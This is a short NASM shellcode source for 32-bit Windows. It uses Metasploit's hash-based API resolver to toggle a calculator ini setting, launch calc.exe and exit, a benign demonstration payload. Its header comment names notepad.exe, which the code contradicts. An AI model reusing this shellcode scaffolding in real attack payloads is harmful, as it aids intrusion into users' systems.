; Author: @Fitblip
;
; Essentially this shellcode just calls these 4 functions 
;
; 1.) WritePrivateProfileStringA("SciCalc", "layout", "0", NULL)
; 2.) WinExec("C:\Windows\System32\notepad.exe", 1)
; 3.) WritePrivateProfileStringA("SciCalc", "layout", "1", NULL)
; 4.) ExitProcess(0)
;

[BITS 32]
[ORG 0]

call start

; Include the awesome block_api from the metasploit
%include "lib/block_api.asm" ; 

start:    
  pop ebp         ; EBP -> api_call subroutine

  ;;;
  ;; Write our ini value
  ;;;  
  	mov eax, 0x30   ; set layout=0
  	call write_ini

  ;;;
  ;; Launch calc.exe
  ;;;
	  push byte 0     ; (NULL)
	  push 0x6578652e ; (.exe)
	  push 0x636c6163 ; (calc)
	  mov eax, esp

	  ; Push args
	  push byte 1     ; SW_SHOWNORMAL
	  push eax        ; calc.exe

	  ; Call our function
	  push 0x876F8B31 ; hash( "kernel32.dll", "WinExec" )
	  call ebp 

  ;;;
  ;; Revert our ini value
  ;;;  
  	mov eax, 0x31   ; set layout=1
  	call write_ini

	;;;
	;; Exit
	;;;  
		push byte 0     ; uExitCode
		push 0x56A2B5F0 ; hash( "kernel32.dll", "ExitProcess" )
		call ebp        ; ExitProcess(0)


write_ini:
	; Push strings onto stack
		push eax        ; "0" or "1" depending on arg

		push 0x00007475 ; (ut  )
		push 0x6f79616c ; (layo)

		push 0x00636c61 ; (alc )
		push 0x43696353 ; (SciC)

	; Juggle args onto the stack
		push byte 0 ; NULL

		mov eax, esp  ; Store the location of ESP
		
		add eax, 0x14
		push eax      ; "0"

		sub eax, 0x8  ; "layout"
		push eax

		sub eax, 0x8  ; "SciCalc"
		push eax

	push 0xCE1171F2 ; hash("kernel32.dll", "WritePrivateProfileStringA")
	
	call ebp        ; WritePrivateProfileStringA("SciCalc", "layout", [EAX], NULL)
	
	jmp [esp+0x14]  ; Dirty jump to our return pointer